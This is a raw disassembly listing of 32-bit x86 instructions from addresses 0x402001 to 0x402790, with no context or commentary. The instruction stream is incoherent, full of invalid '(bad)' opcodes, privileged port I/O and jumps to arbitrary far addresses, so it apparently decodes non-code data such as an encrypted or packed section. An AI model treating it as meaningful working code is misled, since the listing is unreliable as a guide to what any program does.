  402001:	mov    ch,0x3d
  402003:	fld    DWORD PTR [eax+0x5f048a3c]
  402009:	add    dh,BYTE PTR [edi]
  40200b:	ror    BYTE PTR [ebx],cl
  40200d:	aas    
  40200e:	lds    ebp,FWORD PTR [ebx+0x50fb1388]
  402014:	xlat   BYTE PTR ds:[ebx]
  402015:	aad    0xbb
  402017:	hlt    
  402018:	sahf   
  402019:	scas   al,BYTE PTR es:[edi]
  40201a:	pop    esi
  40201b:	or     edx,DWORD PTR [edi-0x1d4640e]
  402021:	jmp    0x402025
  402023:	pop    ds
  402024:	sbb    al,0xb3
  402026:	mov    al,al
  402028:	jg     0x401fe7
  40202a:	lea    esp,[edx+0x4cac45d1]
  402030:	xor    ebx,eax
  402032:	or     ebp,0x6296ca4b
  402038:	xor    edi,eax
  40203a:	add    esi,DWORD PTR [ebp-0x74f10947]
  402040:	xchg   DWORD PTR ds:0xd96998d4,edx
  402046:	je     0x40209b
  402048:	push   ecx
  402049:	out    dx,al
  40204a:	pop    edi
  40204b:	(bad)  
  40204c:	cli    
  40204d:	js     0x40202a
  40204f:	mov    bh,0xac
  402051:	es hlt 
  402053:	jne    0x402055
  402055:	rcl    DWORD PTR [ecx+eax*1-0x42],cl
  402059:	xchg   ebx,eax
  40205a:	push   0xad783b7
  40205f:	and    DWORD PTR [ebx-0x31],eax
  402062:	xchg   edi,eax
  402063:	out    0xe9,al
  402065:	je     0x401fe9
  402067:	dec    dx
  402069:	lea    esi,[ecx]
  40206b:	xlat   BYTE PTR ds:[ebx]
  40206c:	sbb    al,0x2
  40206e:	pushf  
  40206f:	call   0xbd2ac5ea
  402074:	and    cl,dh
  402076:	mov    bh,0xc2
  402078:	dec    edi
  402079:	in     eax,0xd6
  40207b:	outs   dx,BYTE PTR ds:[esi]
  40207c:	or     eax,0xd347c416
  402081:	ror    DWORD PTR [eax+eiz*4-0x638589a0],1
  402088:	mov    eax,ds:0x419e8455
  40208d:	add    DWORD PTR [ebx-0x28e647b6],ebp
  402093:	inc    ebp
  402094:	mov    ?,WORD PTR es:[eax]
  402097:	inc    ecx
  402098:	cs sahf 
  40209a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40209b:	aam    0xa0
  40209d:	out    dx,al
  40209e:	xchg   esp,eax
  40209f:	sub    DWORD PTR [esi],eax
  4020a1:	dec    edi
  4020a2:	xchg   edx,eax
  4020a3:	inc    esp
  4020a4:	pusha  
  4020a5:	imul   esi
  4020a7:	fldenv [edx+0x7d]
  4020aa:	jg     0x4020c1
  4020ac:	cmp    DWORD PTR [ecx+edi*2],eax
  4020af:	mov    eax,ds:0xb4d44a25
  4020b4:	and    ebp,ebx
  4020b6:	aas    
  4020b7:	pop    es
  4020b8:	std    
  4020b9:	sbb    BYTE PTR ds:0xd62290e,dh
  4020bf:	in     eax,0x52
  4020c1:	pop    esi
  4020c2:	fs push ss
  4020c4:	push   ebp
  4020c5:	rol    esp,0x7d
  4020c8:	imul   ebx,DWORD PTR ds:0xcaad2a75,0xfffffff9
  4020cf:	cmp    DWORD PTR [eax-0x40],0x24
  4020d3:	xchg   esp,eax
  4020d4:	adc    DWORD PTR [edx],0xffffff8c
  4020d7:	rol    DWORD PTR [ebp-0x19],1
  4020da:	ret    0x89ee
  4020dd:	out    dx,al
  4020de:	push   esi
  4020df:	mov    dh,0x25
  4020e1:	cli    
  4020e2:	fild   QWORD PTR [esi]
  4020e4:	clc    
  4020e5:	adc    al,BYTE PTR [edx+ebp*8+0x16223aca]
  4020ec:	sub    bl,ah
  4020ee:	ret    
  4020ef:	test   cl,ch
  4020f1:	in     al,0x9a
  4020f3:	outs   dx,DWORD PTR ds:[esi]
  4020f4:	bound  ebx,QWORD PTR [ebx]
  4020f6:	xlat   BYTE PTR ds:[ebx]
  4020f7:	fisttp WORD PTR [esi+0x41]
  4020fa:	or     DWORD PTR [ebx],0xffffffa4
  4020fd:	cmp    BYTE PTR [eax+0x5d],bh
  402100:	int    0xfb
  402102:	test   al,0x1c
  402104:	(bad)
  402107:	aaa    
  402108:	ret    0xb9a5
  40210b:	seto   BYTE PTR [eax+0x3e054474]
  402112:	mov    cs,ecx
  402114:	jno    0x402163
  402116:	jmp    0x4f9a:0xe5c65bf7
  40211d:	ficom  WORD PTR [ecx+0x5d0b5139]
  402123:	sub    dl,BYTE PTR [edx+0x53357250]
  402129:	loope  0x40218b
  40212b:	outs   dx,BYTE PTR ds:[esi]
  40212c:	mov    dh,0x45
  40212e:	sbb    bl,BYTE PTR [ebx+ecx*8-0x271a81aa]
  402135:	adc    al,0x64
  402137:	lods   eax,DWORD PTR ds:[esi]
  402138:	push   es
  402139:	xchg   ecx,eax
  40213a:	test   al,0xdf
  40213c:	mov    ch,0xcc
  40213e:	or     BYTE PTR [edx-0xe4bc453],0xc5
  402145:	js     0x40215b
  402147:	add    eax,0x7bb2a9ae
  40214c:	jmp    0xe4db9347
  402151:	iret   
  402152:	inc    ebp
  402153:	xlat   BYTE PTR ds:[ebx]
  402154:	xchg   esp,eax
  402155:	loope  0x4020ec
  402157:	pop    edx
  402158:	dec    ebp
  402159:	in     al,0xb1
  40215b:	icebp  
  40215c:	popa   
  40215d:	mov    ds:0x7ee5e0cd,eax
  402162:	shl    DWORD PTR [edi+ebp*2],cl
  402165:	jl     0x402137
  402167:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402169:	inc    edx
  40216a:	in     al,dx
  40216b:	int3   
  40216c:	xor    ebx,edi
  40216e:	clc    
  40216f:	clc    
  402170:	lds    ebx,FWORD PTR [edi]
  402172:	fld    DWORD PTR [eax-0x7548b957]
  402178:	xchg   edx,eax
  402179:	sub    eax,0xab47d10e
  40217e:	mov    dl,0xfe
  402180:	(bad)  
  402181:	(bad)  
  402182:	cmc    
  402183:	lods   eax,DWORD PTR ds:[esi]
  402185:	hlt    
  402186:	pop    ebx
  402187:	cmp    esp,esp
  402189:	(bad)  
  40218b:	cmp    al,ah
  40218d:	jbe    0x40216f
  40218f:	mov    ah,0x79
  402191:	cmp    edx,DWORD PTR [edx-0x1420edfc]
  402197:	stc    
  402198:	push   ebx
  402199:	test   BYTE PTR [ecx+0x21f8fba1],dh
  40219f:	test   DWORD PTR [edi+ebx*1+0x78d9d633],eax
  4021a6:	(bad)  [edi+0x8]
  4021a9:	popf   
  4021aa:	(bad)  
  4021ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ac:	sbb    dh,BYTE PTR [ebx+0x66]
  4021af:	(bad)  
  4021b0:	xchg   edi,eax
  4021b1:	cld    
  4021b2:	dec    eax
  4021b3:	adc    ch,cl
  4021b5:	(bad)  
  4021b6:	(bad)  
  4021b7:	sub    edx,DWORD PTR [ebx+0x2f]
  4021ba:	xor    eax,0x692bcbfb
  4021bf:	bound  ebp,QWORD PTR [edi-0x6ebeda02]
  4021c5:	xchg   DWORD PTR [edx-0x678de77a],edx
  4021cb:	cli    
  4021cc:	sbb    ecx,0x3e
  4021cf:	inc    ecx
  4021d0:	scas   al,BYTE PTR es:[edi]
  4021d1:	xchg   ebx,eax
  4021d2:	lods   eax,DWORD PTR ds:[esi]
  4021d3:	call   0xbff1:0xe7caad5d
  4021da:	xor    dh,BYTE PTR [esi]
  4021dc:	jns    0x4021bb
  4021de:	test   eax,0xfddf9f8f
  4021e3:	mov    ebx,0xa1b8a227
  4021e8:	or     eax,0xe2e3f1e3
  4021ed:	test   eax,0xb37f57dc
  4021f2:	push   cs
  4021f3:	pop    ecx
  4021f4:	jle    0x402242
  4021f6:	mov    ah,0x10
  4021f8:	mov    ch,0x1e
  4021fa:	fisttp QWORD PTR [ecx]
  4021fc:	cli    
  4021fd:	dec    esi
  4021fe:	inc    esi
  4021ff:	mov    BYTE PTR [edx-0x31a7be1a],dl
  402205:	stos   BYTE PTR es:[edi],al
  402206:	or     al,BYTE PTR [ecx-0x53]
  402209:	push   cs
  40220a:	ss das 
  40220c:	into   
  40220d:	pop    edx
  40220e:	cmc    
  40220f:	(bad)  
  402211:	sub    al,0x5a
  402213:	sub    al,0x8f
  402215:	das    
  402216:	repz xchg esi,eax
  402218:	pop    ecx
  402219:	sub    DWORD PTR [ecx-0xe],0x128b9b3d
  402220:	frstor [edx]
  402222:	dec    esi
  402223:	adc    al,0x7d
  402225:	ret    0x850d
  402228:	ins    BYTE PTR es:[edi],dx
  402229:	sbb    eax,ebx
  40222b:	int3   
  40222c:	data16 repz sbb ah,dh
  402230:	mov    al,ds:0x1efc9fcb
  402235:	out    dx,al
  402236:	shl    DWORD PTR [esi+0x21],cl
  402239:	rcl    ecx,cl
  40223b:	enter  0x4309,0x4b
  40223f:	dec    ebx
  402240:	les    ecx,FWORD PTR [esi]
  402242:	int3   
  402243:	ja     0x402257
  402245:	test   eax,edx
  402247:	inc    esi
  402248:	sub    edi,esp
  40224a:	test   al,0xfa
  40224c:	sub    esp,DWORD PTR [edi]
  40224e:	fst    QWORD PTR [ebx+0x558e0755]
  402254:	popf   
  402255:	imul   eax,eax,0x35
  402258:	addr16 mov eax,ds:0x81d
  40225c:	test   eax,0xc6390039
  402261:	mov    dh,al
  402263:	popa   
  402264:	push   ecx
  402265:	jg     0x40222b
  402267:	mov    ecx,0xf67303fd
  40226c:	and    esp,DWORD PTR [edi+0x19]
  40226f:	adc    eax,0x9e0f99ab
  402274:	fist   WORD PTR [ecx]
  402276:	je     0x402298
  402278:	imul   esi,DWORD PTR [edx+0x1f],0x6
  40227c:	in     eax,dx
  40227d:	jb     0x402225
  40227f:	retf   0xad3d
  402282:	shr    DWORD PTR [esi+0x11],1
  402285:	mov    edi,0xb0083143
  40228a:	call   0x618e9c17
  40228f:	cmp    esi,DWORD PTR [ebx-0x76]
  402292:	add    al,0xf5
  402294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402295:	dec    ecx
  402296:	pop    eax
  402297:	mov    BYTE PTR [ecx+eiz*2],al
  40229a:	stos   BYTE PTR es:[edi],al
  40229b:	mov    edx,0x2af81de6
  4022a0:	cmp    al,0x89
  4022a2:	or     bl,BYTE PTR ds:0xe47f97e1
  4022a8:	cvtpi2ps xmm1,mm1
  4022ab:	sbb    dl,ch
  4022ad:	pop    edi
  4022ae:	dec    esp
  4022af:	pop    ss
  4022b0:	cmpps  xmm2,XMMWORD PTR [esp+edx*1+0x50927272],0x2c
  4022b9:	sbb    DWORD PTR [edx],edx
  4022bb:	cld    
  4022bc:	sahf   
  4022bd:	mov    al,0xd2
  4022bf:	push   0xffffffef
  4022c1:	add    BYTE PTR [ebp+ebx*4+0x51],0x5d
  4022c6:	call   0x7b26:0xa2f0e1e6
  4022cd:	and    DWORD PTR [edx+0x39],edx
  4022d0:	nop
  4022d1:	popf   
  4022d2:	push   edx
  4022d3:	test   DWORD PTR [eax+0x34],edi
  4022d6:	pop    esp
  4022d7:	jg     0x402322
  4022d9:	ins    DWORD PTR es:[edi],dx
  4022da:	es inc ecx
  4022dc:	push   cs
  4022dd:	add    ah,cl
  4022df:	or     eax,0xdec6d824
  4022e4:	sahf   
  4022e5:	cmp    al,0x8d
  4022e7:	sbb    dl,BYTE PTR [ebx+0x25]
  4022ea:	fidivr WORD PTR [edx]
  4022ec:	aaa    
  4022ed:	sub    ecx,DWORD PTR [edx+0x3c]
  4022f0:	cli    
  4022f1:	scas   eax,DWORD PTR es:[edi]
  4022f2:	int    0x47
  4022f4:	int    0x3f
  4022f6:	int3   
  4022f7:	fadd   QWORD PTR [edx+0x51]
  4022fa:	dec    edx
  4022fb:	sbb    ch,al
  4022fd:	sub    al,0x4c
  4022ff:	sbb    eax,0x7522e375
  402304:	dec    ebp
  402305:	sub    BYTE PTR [esi+0x4c],ah
  402308:	cmp    dl,cl
  40230a:	sar    DWORD PTR [edx+0x0],1
  40230d:	dec    edi
  40230e:	push   esi
  40230f:	in     al,dx
  402310:	sub    cl,ch
  402312:	inc    ecx
  402313:	push   esi
  402314:	leave  
  402315:	out    dx,eax
  402316:	add    eax,0x8ef81233
  40231b:	popf   
  40231c:	mov    edi,0xeab4c786
  402321:	mov    bl,0xa0
  402323:	cmp    DWORD PTR [eax+0x13],ecx
  402326:	jns    0x40238c
  402328:	pop    edi
  402329:	adc    dx,WORD PTR [edx+0x55528dee]
  402330:	jbe    0x402368
  402332:	sbb    eax,0x9ef990ef
  402337:	sahf   
  402338:	inc    ebx
  402339:	aad    0xba
  40233b:	aas    
  40233c:	xlat   BYTE PTR ds:[ebx]
  40233d:	ret    0x3a84
  402340:	test   eax,0x6797cc3b
  402345:	mov    ch,0xa5
  402347:	or     edx,DWORD PTR [bx+di+0x27]
  40234b:	pushf  
  40234c:	xchg   esi,eax
  40234d:	and    ch,BYTE PTR [edx-0x1927a1ce]
  402353:	imul   ecx,DWORD PTR [ecx-0xc],0x21
  402357:	inc    esi
  402358:	pop    edx
  402359:	std    
  40235a:	mov    ds:0x9748d275,al
  40235f:	xlat   BYTE PTR ds:[ebx]
  402360:	mov    ah,ch
  402362:	adc    ecx,ebp
  402364:	mov    dl,0x8e
  402366:	adc    DWORD PTR [esi-0x6ea75c6f],edi
  40236c:	xchg   esp,eax
  40236d:	sub    BYTE PTR ds:0x4d11b9ee,cl
  402373:	adc    DWORD PTR [ebx+0x14],ecx
  402376:	jae    0x4023aa
  402378:	cmc    
  402379:	and    BYTE PTR [esi-0x2815b096],0x66
  402380:	push   0xada1e458
  402385:	shl    BYTE PTR [eax+eax*4],1
  402388:	jns    0x40231e
  40238a:	dec    edi
  40238b:	stos   DWORD PTR es:[edi],eax
  40238c:	push   ebx
  40238d:	ss xchg edi,eax
  40238f:	adc    DWORD PTR [ebx-0x70],eax
  402392:	jb     0x402378
  402394:	xchg   ebp,eax
  402395:	xchg   esi,eax
  402396:	cwde   
  402397:	loopne 0x40240b
  402399:	popa   
  40239a:	dec    edx
  40239b:	lahf   
  40239c:	cmp    eax,0x3a314b1a
  4023a1:	ins    BYTE PTR es:[edi],dx
  4023a2:	and    al,al
  4023a4:	cs and al,0xf9
  4023a7:	mov    ds:0xc54f9135,eax
  4023ac:	jmp    0x30a84e5a
  4023b1:	hlt    
  4023b2:	call   0x3bf7b009
  4023b7:	mov    ds:0xdcd100e2,al
  4023bc:	scas   eax,DWORD PTR es:[edi]
  4023bd:	jp     0x4023b9
  4023bf:	add    esp,DWORD PTR [eax+0x24]
  4023c2:	mov    cs,WORD PTR [esi-0x8]
  4023c5:	xchg   ecx,eax
  4023c6:	add    ebp,DWORD PTR [edi+ebx*4]
  4023c9:	hlt    
  4023ca:	ret    
  4023cb:	push   0x7fdf675c
  4023d0:	inc    ebp
  4023d1:	in     eax,dx
  4023d2:	mov    ecx,DWORD PTR [ebp+0x11]
  4023d5:	loopne 0x402450
  4023d7:	fcom   QWORD PTR [eax+0x34]
  4023da:	sbb    eax,0x5954747e
  4023df:	ins    DWORD PTR es:[edi],dx
  4023e0:	and    al,0x4c
  4023e2:	pop    edx
  4023e3:	data16 (bad) 
  4023e5:	fisttp DWORD PTR [esi+0x3b922060]
  4023eb:	dec    edx
  4023ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ed:	xor    BYTE PTR ss:[edx+0x54],cl
  4023f1:	xchg   edi,eax
  4023f2:	aas    
  4023f3:	pop    esi
  4023f4:	lahf   
  4023f5:	stos   DWORD PTR es:[edi],eax
  4023f6:	pop    ebp
  4023f7:	cwde   
  4023f8:	jg     0x40238e
  4023fa:	popf   
  4023fb:	shl    dl,1
  4023fd:	das    
  4023fe:	and    edx,DWORD PTR [ecx]
  402400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402401:	daa    
  402402:	and    DWORD PTR [eax],eax
  402404:	jge    0x4023a5
  402406:	scas   al,BYTE PTR es:[edi]
  402407:	aas    
  402408:	cmp    BYTE PTR [esi],bh
  40240a:	pop    edi
  40240b:	into   
  40240c:	and    esp,eax
  40240e:	enter  0x5681,0x2b
  402412:	pop    esi
  402413:	ret    0x14d1
  402416:	push   cs
  402417:	mov    ds:0x9ef293a8,al
  40241c:	popa   
  40241d:	pop    es
  40241e:	add    eax,0x93a086ab
  402423:	pop    ebp
  402424:	pop    ds
  402425:	and    al,0x7f
  402427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402428:	sub    ch,cl
  40242a:	fistp  WORD PTR [ecx-0x5f46ccbc]
  402430:	jmp    0x40246d
  402432:	dec    esp
  402433:	outs   dx,DWORD PTR ds:[esi]
  402434:	push   edx
  402435:	xchg   ebx,eax
  402436:	into   
  402437:	xchg   edi,eax
  402438:	stc    
  402439:	add    ah,BYTE PTR ds:0xfd063868
  40243f:	mov    edi,eax
  402441:	mov    eax,ds:0x7c10cabd
  402446:	aaa    
  402447:	adc    DWORD PTR [eax-0x1791647b],0xc2f8df6c
  402451:	popf   
  402452:	jbe    0x402410
  402454:	add    al,0x12
  402456:	xchg   edx,eax
  402457:	cmc    
  402458:	mov    cl,0x2
  40245a:	or     eax,0x1ffe93da
  40245f:	lds    eax,FWORD PTR [ebx]
  402461:	mov    edi,ebx
  402463:	stos   BYTE PTR es:[edi],al
  402464:	jle    0x4024af
  402466:	scas   eax,DWORD PTR es:[edi]
  402467:	sbb    al,BYTE PTR [edi-0x47c98d41]
  40246d:	shl    BYTE PTR [edi-0x113ef812],0x84
  402474:	xlat   BYTE PTR ds:[ebx]
  402475:	jns    0x402400
  402477:	inc    esp
  402478:	mov    edx,0xbd414887
  40247d:	sbb    al,0x11
  40247f:	xor    BYTE PTR [esi],dh
  402481:	xchg   esp,eax
  402482:	dec    ebp
  402483:	aam    0xfe
  402485:	sbb    bh,cl
  402487:	fld    QWORD PTR [edx+edx*2-0x2f]
  40248b:	adc    al,0xa7
  40248d:	call   0x5bd27c1
  402492:	cmp    eax,0x4dffdc5c
  402497:	sub    BYTE PTR [edx],bh
  402499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40249a:	inc    esp
  40249b:	outs   dx,BYTE PTR ds:[esi]
  40249c:	adc    dl,cl
  40249e:	jmp    FWORD PTR [edx]
  4024a0:	and    bh,dl
  4024a2:	push   ecx
  4024a3:	aam    0xf8
  4024a5:	(bad)  [esp+ecx*2]
  4024a8:	outs   dx,DWORD PTR ds:[esi]
  4024a9:	push   eax
  4024aa:	push   edx
  4024ab:	adc    dh,cl
  4024ad:	leave  
  4024ae:	cmp    edi,DWORD PTR [edx+0x9d71045]
  4024b4:	jecxz  0x402524
  4024b6:	inc    esi
  4024b7:	(bad)  
  4024b8:	aaa    
  4024b9:	setbe  BYTE PTR [edx-0x5b]
  4024bd:	popa   
  4024be:	scas   eax,DWORD PTR es:[edi]
  4024bf:	dec    ebp
  4024c0:	rcr    DWORD PTR [esi],cl
  4024c2:	loopne 0x4024d4
  4024c4:	rcr    DWORD PTR [edi+edx*8],cl
  4024c7:	sub    DWORD PTR fs:[eax+0x39],esi
  4024cb:	into   
  4024cc:	sbb    ecx,DWORD PTR [ebp+0x413e28aa]
  4024d2:	outs   dx,DWORD PTR ds:[esi]
  4024d3:	xchg   BYTE PTR [ebx],ch
  4024d5:	test   eax,0xadb55996
  4024da:	in     al,0xf
  4024dc:	loop   0x4024f7
  4024de:	imul   ebp,DWORD PTR [edi+0x7febc8c8],0x3f6249a0
  4024e8:	pop    ebx
  4024e9:	pop    ss
  4024ea:	ja     0x4024ca
  4024ec:	adc    BYTE PTR [ebx],bh
  4024ee:	test   eax,0x5562452b
  4024f3:	(bad)  
  4024f4:	fstp   QWORD PTR [eax+0x96bbfaa]
  4024fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024fb:	scas   al,BYTE PTR es:[edi]
  4024fc:	leave  
  4024fd:	std    
  4024fe:	push   es
  4024ff:	cmp    al,0xcd
  402501:	ins    BYTE PTR es:[edi],dx
  402502:	ins    DWORD PTR es:[edi],dx
  402503:	xchg   esp,eax
  402504:	lods   al,BYTE PTR ds:[esi]
  402505:	pop    es
  402506:	mov    ah,0xf7
  402508:	inc    ebx
  402509:	jle    0x4024bb
  40250b:	mov    dh,0x10
  40250d:	add    DWORD PTR [edx-0x58],esp
  402510:	push   ebp
  402511:	leave  
  402512:	xor    al,0xde
  402514:	xchg   ebp,eax
  402515:	cmp    DWORD PTR [esi+0x680f03eb],esi
  40251b:	jge    0x4024b8
  40251d:	push   ss
  40251e:	dec    edi
  40251f:	sub    eax,0xfd9c71a1
  402524:	lea    esp,[edx-0x46]
  402527:	push   esi
  402528:	or     eax,0x1f09814b
  40252d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252e:	sahf   
  40252f:	sbb    DWORD PTR [edi+0x7882b0f0],edx
  402535:	dec    edi
  402536:	add    DWORD PTR [eax-0x21b9a835],edx
  40253c:	push   es
  40253d:	stos   DWORD PTR es:[edi],eax
  40253e:	hlt    
  40253f:	shl    esi,cl
  402541:	pop    ecx
  402542:	push   ecx
  402543:	xchg   ebx,eax
  402544:	dec    ebx
  402545:	call   0xac4f:0x76a95557
  40254c:	(bad)
  40254f:	mov    eax,ds:0xc3b266fe
  402554:	int    0xd0
  402556:	push   ss
  402557:	je     0x402527
  402559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40255a:	xor    BYTE PTR [edi+0x3154c73a],dl
  402560:	(bad)  
  402561:	sbb    BYTE PTR [ebx+0x7f],al
  402564:	popf   
  402565:	cs push cs
  402567:	mov    bl,0x45
  402569:	sub    al,BYTE PTR [ebx]
  40256b:	and    BYTE PTR [edx],0xce
  40256e:	pop    eax
  40256f:	lds    ebp,FWORD PTR [esi+0x5eee89ad]
  402575:	xor    DWORD PTR [edi],edi
  402577:	add    eax,0x7290b9de
  40257c:	xchg   DWORD PTR [edx-0xb],esp
  40257f:	stos   DWORD PTR es:[edi],eax
  402580:	jbe    0x402544
  402582:	ds out 0x15,eax
  402585:	xchg   ebp,eax
  402586:	repz les esi,FWORD PTR [ebx]
  402589:	pop    ebx
  40258a:	js     0x402577
  40258c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40258d:	int    0x60
  40258f:	inc    ebp
  402590:	retf   
  402591:	cdq    
  402592:	jne    0x40255f
  402594:	or     BYTE PTR [ecx],0x22
  402597:	mov    dl,0x87
  402599:	cmp    ch,BYTE PTR [ecx+esi*2]
  40259c:	lods   al,BYTE PTR ds:[esi]
  40259d:	inc    eax
  40259e:	sub    eax,DWORD PTR [edx-0x3eb5751c]
  4025a4:	(bad)  
  4025a5:	repnz xchg edx,eax
  4025a7:	sbb    esp,esi
  4025a9:	lahf   
  4025aa:	iret   
  4025ab:	fstp   DWORD PTR [edi+0x14]
  4025ae:	mov    ch,0xe3
  4025b0:	mov    DWORD PTR [edi],ebp
  4025b2:	add    cl,dh
  4025b4:	xchg   DWORD PTR [edi-0x62f4584c],edx
  4025ba:	and    edi,DWORD PTR [ecx-0x38f27827]
  4025c0:	push   cs
  4025c1:	inc    esp
  4025c2:	std    
  4025c3:	lds    eax,FWORD PTR [eax-0x36d87838]
  4025c9:	xor    esi,ecx
  4025cb:	or     esp,ecx
  4025cd:	jnp    0x40261f
  4025cf:	pusha  
  4025d0:	xchg   ecx,eax
  4025d1:	outs   dx,DWORD PTR ds:[esi]
  4025d2:	jmp    0xb375:0x93401dc8
  4025d9:	cmp    esp,DWORD PTR [ebp-0x3d]
  4025dc:	adc    eax,0x1f159d53
  4025e1:	pushf  
  4025e2:	stos   BYTE PTR es:[edi],al
  4025e3:	test   al,0x17
  4025e5:	xchg   esp,eax
  4025e6:	lock js 0x40265c
  4025e9:	mov    bl,0x33
  4025eb:	retf   
  4025ec:	bound  edx,QWORD PTR [eax]
  4025ee:	rcr    BYTE PTR [edx+esi*8+0x481cfbdf],1
  4025f5:	repz daa 
  4025f7:	test   DWORD PTR [ebp+0x79244149],ebx
  4025fd:	rol    BYTE PTR [eax+eiz*4-0x6cc0c160],0x4c
  402605:	push   edi
  402606:	(bad)
  402609:	mov    ecx,?
  40260b:	inc    eax
  40260c:	enter  0x88ce,0x86
  402610:	push   edi
  402611:	cdq    
  402612:	pop    ds
  402613:	dec    esi
  402614:	loope  0x40266a
  402616:	jno    0x4025aa
  402618:	pop    ebx
  402619:	retf   
  40261a:	imul   DWORD PTR [edx+0x5e]
  40261d:	jnp    0x402686
  40261f:	xor    ebx,DWORD PTR [edx-0x23]
  402622:	sar    BYTE PTR [eax-0xfe4d1b3],cl
  402628:	jb     0x402657
  40262a:	dec    ecx
  40262b:	in     al,dx
  40262c:	int3   
  40262d:	sbb    al,BYTE PTR [edx-0x69]
  402630:	xor    al,0x72
  402632:	adc    eax,0x1c59fcd4
  402637:	cmp    dh,BYTE PTR [edx-0x49639b88]
  40263d:	call   0xfbb83b22
  402642:	xchg   esi,eax
  402643:	xchg   DWORD PTR [edi-0x17],ebp
  402646:	push   edx
  402647:	mov    ecx,es
  402649:	imul   ebx,DWORD PTR [esp+ebx*8],0xffffffd9
  40264d:	(bad)  
  40264e:	ret    
  40264f:	mov    esp,0x131ce5d7
  402654:	pusha  
  402655:	les    ecx,FWORD PTR [edi]
  402657:	and    DWORD PTR [ecx+esi*2],0xffffffd8
  40265b:	sub    DWORD PTR [edx-0x2fedd87],eax
  402661:	mov    al,ch
  402663:	mov    bh,0x18
  402665:	fstp   DWORD PTR [eax+0x5b]
  402668:	ds sub al,0x5b
  40266b:	jo     0x40268a
  40266d:	sahf   
  40266e:	stc    
  40266f:	loope  0x4026c2
  402671:	psubb  mm2,QWORD PTR [bx+0x7e]
  402676:	push   edi
  402677:	add    eax,0x36c4fb33
  40267c:	jp     0x402660
  40267e:	stos   BYTE PTR es:[edi],al
  40267f:	out    0x75,eax
  402681:	fnstenv [esi]
  402683:	(bad)  
  402684:	or     ch,BYTE PTR [edx+ebx*8+0x44]
  402688:	hlt    
  402689:	add    BYTE PTR [esi],dl
  40268b:	mov    dl,0x9
  40268d:	and    edi,DWORD PTR [ebx-0x15]
  402690:	push   0xb8b134ef
  402695:	pop    ebp
  402696:	and    DWORD PTR [esi+0x66],0xb3bb7292
  40269d:	icebp  
  40269e:	hlt    
  40269f:	lds    esp,FWORD PTR [ebp+ecx*8+0x25]
  4026a3:	loop   0x402696
  4026a5:	cdq    
  4026a6:	inc    edi
  4026a7:	sbb    eax,0xa20e9235
  4026ac:	pop    esp
  4026ad:	fld    QWORD PTR gs:[ebx+0x1655c32]
  4026b4:	jecxz  0x4026f2
  4026b6:	in     eax,0x8f
  4026b8:	shl    DWORD PTR [edi],0xfa
  4026bb:	fcmove st,st(3)
  4026bd:	clc    
  4026be:	push   edi
  4026bf:	(bad)  
  4026c0:	scas   eax,DWORD PTR es:[edi]
  4026c1:	sbb    ebp,eax
  4026c3:	fcomp  st(1)
  4026c5:	dec    edx
  4026c6:	loope  0x40264b
  4026c8:	or     DWORD PTR [edx-0x4d],esp
  4026cb:	mov    esi,0xc95ed5ed
  4026d0:	jp     0x402656
  4026d2:	sub    ah,bl
  4026d4:	inc    ebp
  4026d5:	jle    0x4026f1
  4026d7:	sbb    eax,0xe8d26097
  4026dc:	div    ah
  4026de:	or     DWORD PTR [esi+esi*8],eax
  4026e1:	mov    ds:0x27ad3573,eax
  4026e6:	psrlw  mm2,mm4
  4026e9:	jl     0x402702
  4026eb:	jp     0x4026e1
  4026ed:	in     eax,0x69
  4026ef:	pop    edi
  4026f0:	ins    BYTE PTR es:[edi],dx
  4026f1:	out    0xc2,eax
  4026f3:	in     eax,0xcf
  4026f5:	mov    ds:0x1f07d8f1,eax
  4026fa:	fsubr  QWORD PTR [esi+0x0]
  4026fd:	mov    eax,ds:0x11dda8f9
  402702:	ja     0x4026f2
  402704:	fimul  DWORD PTR [eax+0x68]
  402707:	pop    esp
  402708:	repz push cs
  40270a:	int    0xb
  40270c:	rol    esi,1
  40270e:	mov    eax,0x9e5b84fc
  402713:	fwait
  402714:	sbb    edx,DWORD PTR [ecx-0x8]
  402717:	in     eax,0x11
  402719:	dec    eax
  40271a:	push   ds
  40271b:	call   0x2d10:0x4371b294
  402722:	adc    BYTE PTR [esp+ebp*1-0x45],al
  402726:	dec    edx
  402727:	xor    dh,BYTE PTR [ebx-0x50]
  40272a:	mov    edx,0x9273cf9b
  40272f:	fdiv   QWORD PTR [ebx]
  402731:	retf   
  402732:	retf   
  402733:	movntps XMMWORD PTR [ecx-0x7971e945],xmm6
  40273a:	test   eax,0xbec37342
  40273f:	or     cl,ah
  402741:	in     eax,0x68
  402743:	push   0xb3b8cff2
  402748:	jmp    0x402712
  40274a:	xchg   ebp,eax
  40274b:	mov    al,BYTE PTR [eax+esi*2]
  40274e:	ror    BYTE PTR [ebx],1
  402750:	adc    BYTE PTR [ecx+0x4b12382],0xda
  402757:	cmc    
  402758:	mov    ds:0xe0037958,eax
  40275d:	dec    ecx
  40275e:	stos   DWORD PTR es:[edi],eax
  40275f:	or     BYTE PTR [ebp+0x44ceadcf],ch
  402765:	repnz dec ebx
  402767:	lods   eax,DWORD PTR ds:[esi]
  402768:	dec    ch
  40276a:	popf   
  40276b:	fisttp DWORD PTR [eax]
  40276d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40276e:	retf   0xad27
  402771:	lods   eax,DWORD PTR ds:[esi]
  402772:	sahf   
  402773:	lea    esi,[edi-0x2d]
  402776:	xor    eax,0x665e4109
  40277b:	dec    eax
  40277c:	xchg   ecx,eax
  40277d:	pop    edx
  40277e:	sbb    esp,edx
  402780:	adc    al,0x57
  402782:	out    0x28,eax
  402784:	or     eax,0xd7c56670
  402789:	das    
  40278a:	dec    ebx
  40278b:	jecxz  0x402756
  40278d:	cmc    
  40278e:	iret   
  40278f:	dec    edx
  402790:	lds    eax,FWORD PTR [edx+esi*2]
